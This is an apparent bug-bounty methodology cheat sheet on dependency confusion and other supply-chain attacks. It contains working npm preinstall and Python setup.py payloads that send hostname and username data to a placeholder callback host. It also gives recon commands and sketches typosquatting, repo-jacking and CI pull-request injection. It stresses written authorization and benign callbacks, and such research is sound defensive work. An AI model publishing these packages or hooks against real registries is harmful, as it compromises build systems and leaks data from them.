# Dependency Confusion + Supply Chain — $30K PayPal pattern

> Alex Birsan 2021: PayPal $30K, Apple, Microsoft, Tesla, Yelp all hit. The pattern still works on poorly-configured CI/CD pipelines today.

---

## CORE IDEA

A company uses an internal package `corp-utils` from their private registry. Their CI also checks the public registry. If you publish a package called `corp-utils` to the **public** registry with a **higher version**, and the build tool is configured to prefer highest-version, the build pulls *your* code.

Once your code runs at install/build time, you have RCE on the build agent — which usually has high privilege (deploy keys, cloud creds, SSH access to prod).

---

## STAGE 1 — Find internal package names

### From JS bundles
```bash
# Look for package.json paths in source maps
grep -oE '"name":\s*"[^"]+"' js/*.js
grep -oE '@[a-z0-9-]+/[a-z0-9-]+' js/*.js   # scoped packages
# Common internal indicators
grep -oE '@(corp|internal|company|target)/[a-z0-9-]+' js/*.js
```

### From error pages
Stack traces sometimes leak `at ... node_modules/internal-pkg/...`.

### From GitHub
```
"target-corp" filename:package.json
"target-corp" filename:requirements.txt
"target-corp" filename:Gemfile
"target-corp" filename:pom.xml
"target-corp" filename:Pipfile
"@target/" filename:.npmrc
```

### From Maven repos
```
search: "groupId":"com.target.internal"
```

### From sourcemaps
Webpack sourcemaps reveal complete module paths, including private package names.

---

## STAGE 2 — Check public registry

```bash
# npm
curl -s https://registry.npmjs.org/<pkg-name> | jq .name
# 404 means available

# PyPI
curl -s https://pypi.org/pypi/<pkg-name>/json
# 404 means available

# RubyGems
gem search '^<pkg-name>$' --remote

# Maven Central
curl -s "https://search.maven.org/solrsearch/select?q=g:com.target.internal+AND+a:pkg"
```

If the package name is **NOT** taken on the public registry but you've seen it referenced in target's source -> jackpot candidate.

---

## STAGE 3 — Publish (carefully)

**You must operate within the program's scope.** Most BBPs explicitly allow this kind of supply-chain testing only with the company's prior written consent. Always confirm.

### npm
Set up a benign callback in `preinstall` or `postinstall` that pings your collaborator with:
- hostname
- username
- internal IPs visible
- env var names (NOT values, to be safe)

```json
{
  "name": "corp-utils",
  "version": "99.99.99",
  "scripts": {
    "preinstall": "node -e \"require('http').get('http://your.oast/?h='+require('os').hostname()+'&u='+process.env.USER)\""
  }
}
```

### Python (PyPI)
`setup.py`:
```python
from setuptools import setup
import urllib.request, os, socket
urllib.request.urlopen(f"http://your.oast/?h={socket.gethostname()}&u={os.environ.get('USER','')}")
setup(name="corp-pkg", version="99.99.99")
```

### RubyGems
Use Rake/extconf hooks. Less common but works.

### Maven / Gradle
Harder — Java packages are usually scoped by `groupId`. Confusion works only if internal repo is configured to also resolve from Maven Central with same `groupId`. Rare but not impossible.

### Go (Go modules)
`GOPROXY` chain: if internal proxy + public proxy + sum DB not strict, GOPROXY can be tricked. The exploit pattern is different (rely on module checksum bypass).

---

## STAGE 4 — Confirmation signals

Within 5-60 minutes of publish, watch for:
- DNS hits from cloud-IP ranges of target's CI provider (CircleCI, GitHub Actions, AWS CodeBuild, GitLab CI, Buildkite)
- Hostnames matching `ip-10-x-x-x.ec2.internal` or `runner-...`
- User Agents indicating build tools (`npm/...`, `pip/...`)
- Multiple hits across days as different CI jobs trigger

When confirmed -> immediately write report. **Don't stay in the build agent**. Don't read env values, don't pivot. The PoC is the DNS hit + the published package.

---

## STAGE 5 — Adjacent supply-chain patterns

### Typosquatting
Publish `lod4sh` for `lodash`, `requesst` for `requests`, etc. Higher false-positive rate, but small-bounty hits possible.

### Repo-jacking / Star-jacking
Old GitHub orgs that got renamed/deleted -> register the old name, repo references in dependencies that point to GitHub URL now resolve to your account -> RCE on install.

### Compromised maintainer / npm token
Out of scope for hunting; mention only in defensive context.

### Build-step injection via PR
- Modify `.github/workflows/*.yml` in your PR
- If maintainer auto-runs CI on PRs without manual approval, your malicious step runs
- Use `pwn-request.yml` style attacks (for `pull_request_target` workflow + checkout of PR HEAD)

### Tag/release confusion
- Publish a release with a tag that overrides an existing tag (force push)
- CI that pulls "latest" gets compromised version

### Build artifact storage
- S3 buckets for build artifacts that allow public PUT
- Replace artifact -> next deploy pulls compromised binary

---

## CHAIN RECIPE — From source code to RCE on prod

1. Recon: subfinder finds `ci.target.com`, `artifacts.target.com`
2. JS bundles reveal `@target/auth-utils` (not on npm)
3. Confirm via npm registry — name available
4. Confirm scope (`@target` -> internal scope used in `.npmrc`)
5. Publish `@target/auth-utils@99.99.99` with DNS callback
6. Wait. CI hits.
7. Report: include exact package URL, callback log timestamps, target's CI IP range observation, suggested fix (use `--registry=` exclusively, configure `.npmrc` properly).

---

## VALIDATION CHECKLIST

- Confirm authorization with program owner BEFORE publishing
- Use a benign callback only (DNS + non-sensitive metadata)
- Document exact package, version, registry, timestamps
- Provide safe-to-use cleanup (unpublish or yank)
- Suggest fix in report

---

## TOOLING

- **Confused** (visma-prodsec/confused) — scan package.json/requirements/etc. against public registries
- **Snyk Confusion** — automated scan
- **dep-confusion** — Felix Wilhelm's PoC tool
- **GitGuardian** / **DependencyTrack** for visibility
- nuclei `tags=takeover,confusion`
